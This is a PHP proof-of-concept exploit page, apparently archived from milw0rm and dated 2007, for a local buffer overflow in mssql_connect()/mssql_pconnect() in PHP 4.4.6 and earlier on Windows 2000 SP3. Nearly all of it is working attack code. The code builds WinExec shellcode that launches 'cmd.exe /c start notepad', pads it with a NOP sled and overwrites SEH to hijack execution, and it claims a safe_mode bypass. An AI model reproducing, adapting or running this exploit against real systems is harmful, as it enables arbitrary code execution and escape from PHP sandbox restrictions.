<html><head><title>PHP <= 4.4.6 mssql_[p]connect() Local Buffer Overflow Exploit</title></head><pre>&lt;?php

// PHP &lt;= 4.4.6 mssql_connect() &amp; mssql_pconnect() local buffer overflow
// poc exploit (and safe_mode bypass)
// windows 2000 sp3 en / seh overwrite
// by rgod
// site: http://retrogod.altervista.org

// u can easily adjust for php5
// this as my little contribute to MOPB

$____scode=
&quot;\xeb\x1b&quot;.
&quot;\x5b&quot;.
&quot;\x31\xc0&quot;.
&quot;\x50&quot;.
&quot;\x31\xc0&quot;.
&quot;\x88\x43\x59&quot;.
&quot;\x53&quot;.
&quot;\xbb\xca\x73\xe9\x77&quot;. //WinExec
&quot;\xff\xd3&quot;.
&quot;\x31\xc0&quot;.
&quot;\x50&quot;.
&quot;\xbb\x5c\xcf\xe9\x77&quot;. //ExitProcess
&quot;\xff\xd3&quot;.
&quot;\xe8\xe0\xff\xff\xff&quot;.
&quot;\x63\x6d\x64&quot;.
&quot;\x2e&quot;.
&quot;\x65&quot;.
&quot;\x78\x65&quot;.
&quot;\x20\x2f&quot;.
&quot;\x63\x20&quot;.
&quot;start notepad &amp; &quot;;

   $eip=&quot;\xdc\xf5\x12&quot;;
   $____suntzu=str_repeat(&quot;\x90&quot;,100);
   $____suntzu.=$____scode;
   $____suntzu.=str_repeat(&quot;a&quot;,2460 - strlen($____scode));
   $____suntzu.=$eip;
   mssql_pconnect($____suntzu);

?&gt;

# milw0rm.com [2007-03-05]</pre></html>